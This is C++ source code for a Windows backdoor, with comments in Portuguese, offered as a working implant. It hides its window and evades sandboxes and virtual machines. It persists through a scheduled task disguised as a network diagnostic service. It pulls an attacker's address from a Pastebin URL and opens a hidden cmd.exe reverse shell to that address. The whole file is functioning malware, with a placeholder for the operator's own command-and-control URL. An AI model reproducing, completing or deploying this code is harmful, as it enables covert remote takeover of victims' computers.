#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iostream>
#include <string>
#include <vector>

#pragma comment(lib, "ws2_32.lib")

// Nossos módulos customizados
#include "Obfuscator.hpp"
#include "AntiSandbox.hpp"
#include "DownloadManager.hpp"
#include "PersistenceManager.hpp"

// Protótipo da função (Avisa o compilador que ela existe lá embaixo)
void ExecuteReverseShell(const std::string& ip, int port);

int main() {
    // --- 1. OCULTAÇÃO DA INTERFACE ---
    HWND hWnd = GetConsoleWindow();
    if (hWnd) ShowWindow(hWnd, SW_HIDE);

    // --- 2. DEFESA ATIVA (ANTI-ANALYSIS) ---
    // Se for testar em um ambiente controlado, comente essa parte para evitar falsos positivos
    if (AntiSandbox::IsLowResources() || AntiSandbox::IsSingleCore() || AntiSandbox::IsVirtualMachine()) {
        return 0; 
    }

    // --- 3. EVASÃO POR TEMPO ---
    AntiSandbox::ExecuteHeavyDelay(120000000); 

    // --- 4. PERSISTÊNCIA (TASK SCHEDULER) ---
    wchar_t szPath[MAX_PATH];
    GetModuleFileNameW(NULL, szPath, MAX_PATH);
    PersistenceManager::CreateLogonTask(L"WinNetDiagnosticService", szPath);

    // --- 5. COMUNICAÇÃO C2 (MEMORY-ONLY) ---
    DownloadManager dl;
    std::string rawCommand = dl.FetchRemoteCommand(PROTECT("https://pastebin.com/raw/YOUR-PASTEVIN-ID")); // Substitua pelo seu URL real

    if (!rawCommand.empty()) {
        // --- 6. PARSING DO COMANDO ---
        size_t delimiterPos = rawCommand.find('|');
        if (delimiterPos != std::string::npos) {
            std::string ip = rawCommand.substr(0, delimiterPos);
            int port = std::stoi(rawCommand.substr(delimiterPos + 1));

            // --- 7. PAYLOAD FINAL (REVERSE SHELL) ---
            ExecuteReverseShell(ip, port); // Passando a string diretamente
        }
    }
    return 0;
}

// Implementação da função usando API moderna e segura
void ExecuteReverseShell(const std::string& ip, int port) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return;

    SOCKET s = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (s == INVALID_SOCKET) {
        WSACleanup();
        return;
    }

    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(static_cast<unsigned short>(port));
    
    // Uso correto do inet_pton
    if (inet_pton(AF_INET, ip.c_str(), &addr.sin_addr) <= 0) {
        closesocket(s);
        WSACleanup();
        return;
    }

    if (WSAConnect(s, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        closesocket(s);
        WSACleanup();
        return;
    }

    STARTUPINFOA sinfo;
    PROCESS_INFORMATION pinfo;
    SecureZeroMemory(&sinfo, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)s;
    sinfo.wShowWindow = SW_HIDE;

    char cmdPath[] = "cmd.exe";
    if (CreateProcessA(NULL, cmdPath, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo)) {
        CloseHandle(pinfo.hProcess);
        CloseHandle(pinfo.hThread);
    }
}